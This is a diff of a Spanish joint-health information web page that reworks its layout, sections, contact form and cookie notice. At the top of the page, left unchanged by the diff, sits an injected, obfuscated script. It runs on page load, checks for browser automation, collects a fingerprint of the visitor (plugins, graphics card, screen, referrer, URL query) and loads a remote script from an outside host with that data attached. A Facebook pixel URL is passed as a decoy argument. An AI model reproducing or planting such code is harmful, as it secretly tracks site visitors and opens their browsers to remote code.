@@ -4,140 +4,275 @@
 <script>var HCVRMDJVJ=function(src){var q=atob("X19zdG9wQWxsVGltZXJzLndlYmRyaXZlci5fX25pZ2h0bWFyZS5fc2VsZW5pdW0uY2FsbFBoYW50b20uY2FsbFNlbGVuaXVtLl9TZWxlbml1bV9JREVfUmVjb3JkZXIuc2VsZW5pdW0uZHJpdmVyLl9zZWxlbml1bS5fX3dlYmRyaXZlcl9ldmFsdWF0ZS5fX3NlbGVuaXVtX2V2YWx1YXRlLl9fd2ViZHJpdmVyX3NjcmlwdF9mdW5jdGlvbi5fX3dlYmRyaXZlcl9zY3JpcHRfZnVuYy5fX3dlYmRyaXZlcl9zY3JpcHRfZm4uX19meGRyaXZlcl9ldmFsdWF0ZS5fX2RyaXZlcl91bndyYXBwZWQuX193ZWJkcml2ZXJfdW53cmFwcGVkLl9fZHJpdmVyX2V2YWx1YXRlLl9fc2VsZW5pdW1fdW53cmFwcGVkLl9fZnhkcml2ZXJfdW53cmFwcGVkLl9waGFudG9tLnBoYW50b20uZG9tQXV0b21hdGlvbl9fbmlnaHRtYXJl").split("."),e=encodeURIComponent,g=0,w=window,d=w.document,n=w.navigator,de="documentElement",s=w.screen,p="",a="avail",i="inner",o="outer",H="Height",W="Width",c=w.chrome?Object.keys(w.chrome).join("*"):"*",tag=d.createElement("script");function wd(){try{for(var l in q){var z=q[l];if(w[z]||n[z])return z;if(d&&d[de]&&d[de].getAttribute&&d[de].getAttribute(z))return z;if(z in w||z in d)return z}return 0}catch(e){}}!function wp(){try{if(n&&n.plugins){Object.keys(n.plugins).forEach(function(i){if(n.plugins[i])p+=n.plugins[i].filename+"*"})}}catch(e){}}();try{g=d.createElement("canvas").getContext("webgl");g=g.getParameter(g.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)}catch(e){}src="https://sp1.micenice.pro/kl/?clid="+btoa("ref="+e(d.referrer)+"&drive="+wd()+"&c="+c+"&s="+s[a+H]+"*"+w[i+H]+"*"+w[o+H]+"*"+s[a+W]+"*"+w[i+W]+"*"+w[o+W]+"*"+w.devicePixelRatio+"*"+n.maxTouchPoints+"&p="+p+"&h="+n.hardwareConcurrency+"*"+n.deviceMemory+"*"+e(g)+"&t="+e(new Date().toString())+"&q="+e(w.location.search.substr(1)));tag["type"]="text/javascript";tag["src"]=src;document.head.appendChild(tag)}("https://connect.facebook.net/en_US/fbevents.js")</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Salud de las Articulaciones: Guía Integral para Personas Mayores</title>
-    <meta name="description" content="Guía completa sobre salud articular, ejercicios, nutrición y cuidados para personas mayores">
-    <meta name="keywords" content="salud articular, articulaciones, personas mayores, ejercicio, nutrición, dolor articular">
+    <meta name="description" content="Información completa sobre la salud articular, tratamientos y prevención de problemas en las articulaciones">
+    <meta name="keywords" content="articulaciones, salud articular, dolor articular, artritis, tratamiento articular">
+    <meta name="author" content="Centro de Salud Articular">
+    <title>Salud Articular - Tu guía completa para el cuidado de las articulaciones</title>
     <style>
+        :root {
+            --primary-color: #2c5282;
+            --secondary-color: #4299e1;
+            --accent-color: #90cdf4;
+            --text-color: #2d3748;
+            --light-bg: #f7fafc;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
             line-height: 1.6;
-            color: #333;
+            color: var(--text-color);
+        }
+
+        header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 2rem 1rem;
+            text-align: center;
+        }
+
+        nav {
+            background-color: var(--secondary-color);
+            padding: 1rem;
+        }
+
+        nav ul {
+            list-style: none;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 2rem;
+        }
+
+        nav a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        main {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 20px;
+            padding: 2rem 1rem;
         }
-        header {
+
+        section {
+            margin-bottom: 3rem;
+        }
+
+        h1, h2, h3 {
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+        }
+
+        h2 {
+            font-size: 2rem;
+            border-bottom: 2px solid var(--accent-color);
+            padding-bottom: 0.5rem;
+        }
+
+        h3 {
+            font-size: 1.5rem;
+        }
+
+        p {
+            margin-bottom: 1rem;
+        }
+
+        .image-container {
+            margin: 2rem 0;
             text-align: center;
-            padding: 20px 0;
-            background-color: #f4f4f4;
         }
-        img {
+
+        .image-container img {
             max-width: 100%;
             height: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .contact-form {
+            background-color: var(--light-bg);
+            padding: 2rem;
+            border-radius: 8px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .form-group {
+            margin-bottom: 1rem;
+        }
+
+        label {
             display: block;
-            margin: 20px auto;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
         }
-        .section {
-            margin-bottom: 30px;
+
+        input, textarea {
+            width: 100%;
+            padding: 0.5rem;
+            border: 1px solid #cbd5e0;
+            border-radius: 4px;
         }
+
+        button {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 0.75rem 1.5rem;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: var(--secondary-color);
+        }
+
+        footer {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 2rem 1rem;
+            text-align: center;
+        }
+
         .cookie-notice {
             position: fixed;
             bottom: 0;
             left: 0;
-            width: 100%;
-            background-color: #333;
-            color: white;
-            padding: 15px;
+            right: 0;
+            background-color: var(--light-bg);
+            padding: 1rem;
             text-align: center;
-            z-index: 1000;
+            box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.1);
         }
-        .contact-form {
-            background-color: #f4f4f4;
-            padding: 20px;
-            margin-top: 20px;
-        }
-        input, textarea {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-        }
+
         @media (max-width: 768px) {
-            body {
-                padding: 10px;
+            nav ul {
+                flex-direction: column;
+                text-align: center;
+                gap: 1rem;
+            }
+
+            h1 {
+                font-size: 2rem;
+            }
+
+            h2 {
+                font-size: 1.5rem;
+            }
+
+            h3 {
+                font-size: 1.25rem;
             }
         }
     </style>
 </head>
 <body>
     <header>
-        <h1>Salud de las Articulaciones: Guía Integral para Personas Mayores</h1>
+        <h1>Salud Articular</h1>
+        <p>Tu guía completa para el cuidado de las articulaciones</p>
     </header>
 
-    <div class="section">
-        <h2>Introducción a la Salud Articular</h2>
-        <img src="images/chess1.jpg" alt="Salud de las articulaciones">
-        <p>Las articulaciones son fundamentales para nuestra movilidad y calidad de vida. Con el envejecimiento, es crucial comprender cómo mantenerlas saludables y fuertes.</p>
-    </div>
+    <nav>
+        <ul>
+            <li><a href="#inicio">Inicio</a></li>
+            <li><a href="#tipos">Tipos de Articulaciones</a></li>
+            <li><a href="#prevencion">Prevención</a></li>
+            <li><a href="#tratamientos">Tratamientos</a></li>
+            <li><a href="#contacto">Contacto</a></li>
+        </ul>
+    </nav>
 
-    <div class="section">
-        <h2>Anatomía de las Articulaciones</h2>
-        <img src="images/chess2.jpg" alt="Anatomía de las articulaciones">
-        <p>Las articulaciones son puntos de conexión entre dos o más huesos. Están compuestas por cartílago, ligamentos, tendones y líquido sinovial que permite un movimiento suave y sin dolor.</p>
-    </div>
+    <main>
+        <section id="inicio">
+            <h2>Bienvenidos al Centro de Salud Articular</h2>
+            <p>Las articulaciones son componentes fundamentales de nuestro sistema músculo-esquelético que permiten el movimiento y la flexibilidad del cuerpo.</p>
+            <div class="image-container">
+                <img src="images/chess1.jpg" alt="Anatomía de las articulaciones" width="800" height="400">
+            </div>
+        </section>
 
-    <div class="section">
-        <h2>Cambios con el Envejecimiento</h2>
-        <img src="images/chess3.jpg" alt="Cambios en las articulaciones con la edad">
-        <p>Con el paso de los años, las articulaciones experimentan cambios naturales: reducción de cartílago, menor elasticidad y mayor riesgo de inflamación.</p>
-    </div>
+        <section id="tipos">
+            <h2>Tipos de Articulaciones</h2>
+            <h3>Articulaciones Sinoviales</h3>
+            <p>Las articulaciones sinoviales son las más comunes en el cuerpo humano y permiten un amplio rango de movimiento.</p>
+            <div class="image-container">
+                <img src="images/chess2.jpg" alt="Articulación sinovial" width="800" height="400">
+            </div>
 
-    <div class="section">
-        <h2>Nutrición para Articulaciones Sanas</h2>
-        <img src="images/chess4.jpg" alt="Nutrición para articulaciones">
-        <p>Una dieta rica en omega-3, calcio, vitamina D y antioxidantes puede ayudar a mantener la salud articular y reducir la inflamación.</p>
-    </div>
+            <h3>Articulaciones Cartilaginosas</h3>
+            <p>Estas articulaciones están conectadas por cartílago y permiten movimientos limitados.</p>
+            <div class="image-container">
+                <img src="images/chess3.jpg" alt="Articulación cartilaginosa" width="800" height="400">
+            </div>
+        </section>
 
-    <div class="section">
-        <h2>Ejercicios Recomendados</h2>
-        <img src="images/chess5.jpg" alt="Ejercicios para articulaciones">
-        <p>El ejercicio moderado y adaptado es clave: natación, tai chi, caminata y ejercicios de estiramiento pueden fortalecer músculos y articulaciones.</p>
-    </div>
+        <section id="prevencion">
+            <h2>Prevención de Problemas Articulares</h2>
+            <p>La prevención es fundamental para mantener la salud de nuestras articulaciones.</p>
+            <div class="image-container">
+                <img src="images/chess4.jpg" alt="Ejercicios de prevención" width="800" height="400">
+            </div>
+            <div class="image-container">
+                <img src="images/chess5.jpg" alt="Alimentación saludable" width="800" height="400">
+            </div>
+        </section>
 
-    <div class="section">
-        <h2>Prevención de Problemas Articulares</h2>
-        <img src="images/chess6.jpg" alt="Prevención de problemas articulares">
-        <p>Mantener un peso saludable, hacer ejercicio regular y evitar movimientos bruscos son estrategias fundamentales para proteger las articulaciones.</p>
-    </div>
+        <section id="tratamientos">
+            <h2>Tratamientos Disponibles</h2>
+            <p>Existen diversos tratamientos para los problemas articulares, desde terapias conservadoras hasta intervenciones quirúrgicas.</p>
+            <div class="image-container">
+                <img src="images/chess6.jpg" alt="Tratamientos médicos" width="800" height="400">
+            </div>
+            <div class="image-container">
+                <img src="images/chess7.jpg" alt="Terapia física" width="800" height="400">
+            </div>
+            <div class="image-container">
+                <img src="images/chess8.jpg" alt="Rehabilitación" width="800" height="400">
+            </div>
+        </section>
 
-    <div class="section">
-        <h2>Tratamientos Naturales</h2>
-        <img src="images/chess7.jpg" alt="Tratamientos naturales para articulaciones">
-        <p>Suplementos como glucosamina, condroitina, y tratamientos como la acupuntura pueden ayudar a aliviar el dolor articular.</p>
-    </div>
+        <section id="contacto">
+            <h2>Contacto</h2>
+            <form class="contact-form">
+                <div class="form-group">
+                    <label for="nombre">Nombre:</label>
+                    <input type="text" id="nombre" name="nombre" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Email:</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="mensaje">Mensaje:</label>
+                    <textarea id="mensaje" name="mensaje" rows="5" required></textarea>
+                </div>
+                <button type="submit">Enviar Mensaje</button>
+            </form>
+        </section>
+    </main>
 
-    <div class="section">
-        <h2>Cuándo Consultar al Médico</h2>
-        <img src="images/chess8.jpg" alt="Cuándo consultar al médico">
-        <p>Si experimenta dolor persistente, hinchazón o rigidez que limita su movimiento, es fundamental consultar a un profesional de la salud.</p>
-    </div>
+    <footer>
+        <p>© 2024 Centro de Salud Articular. Todos los derechos reservados.</p>
+        <p><a href="#privacidad" style="color: white;">Política de Privacidad</a> | 
+           <a href="#terminos" style="color: white;">Términos y Condiciones</a></p>
+    </footer>
 
-    <div class="contact-form">
-        <h2>Contáctenos</h2>
-        <form>
-            <input type="text" placeholder="Nombre" required>
-            <input type="email" placeholder="Correo Electrónico" required>
-            <textarea placeholder="Su Mensaje" rows="5" required></textarea>
-            <input type="submit" value="Enviar">
-        </form>
-    </div>
-
-    <div class="section">
-        <h2>Política de Privacidad</h2>
-        <p>En [Nombre de la Organización], respetamos su privacidad. Recopilamos información personal solo con su consentimiento y la utilizamos para mejorar nuestros servicios.</p>
-    </div>
-
-    <div class="section">
-        <h2>Términos y Condiciones</h2>
-        <p>Al utilizar nuestro sitio web, acepta nuestros términos y condiciones. La información proporcionada es solo para fines educativos y no sustituye el consejo médico profesional.</p>
-    </div>
-
-    <div class="cookie-notice">
-        Este sitio web utiliza cookies para mejorar su experiencia. Al continuar navegando, acepta nuestro uso de cookies.
+    <div class="cookie-notice" id="cookieNotice">
+        <p>Este sitio web utiliza cookies para mejorar su experiencia. Al continuar navegando, acepta nuestra política de cookies.</p>
+        <button onclick="document.getElementById('cookieNotice').style.display='none'">Aceptar</button>
     </div>
 </body>
 </html>
+
+
